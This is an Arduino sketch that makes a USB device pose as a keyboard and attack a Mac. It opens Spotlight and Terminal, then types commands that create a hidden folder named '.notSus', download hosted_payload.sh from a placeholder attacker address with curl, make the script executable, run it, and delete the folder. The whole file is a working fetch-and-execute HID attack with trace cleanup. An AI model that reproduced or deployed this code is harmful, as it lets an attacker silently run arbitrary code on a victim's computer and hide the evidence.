#include "Keyboard.h"

// MACROS =====================================================================
void printAndWait(char *input, unsigned long delayTime) {
  Keyboard.print(input);
  delay(delayTime);
}

void spawnTerminal() {
  // Open spotlight search
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(500);
  Keyboard.releaseAll();

  // Open the terminal
  Keyboard.print("Terminal");
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();

}

// MAIN =======================================================================
void setup() {
  Keyboard.begin();
  delay(1000);
  spawnTerminal();

  printAndWait("mkdir .notSus\n", 500);
  printAndWait("cd .notSus\n", 500);
  printAndWait("curl -O http://<ATTACKER_IP>:8000/hosted_payload.sh\n", 1000);
  printAndWait("chmod +x hosted_payload.sh\n", 500);
  printAndWait("./hosted_payload.sh\n", 500);
  printAndWait("cd ..\n", 500);
  printAndWait("rm -rf .notSus\n", 500);

  Keyboard.end();
}

void loop() {

}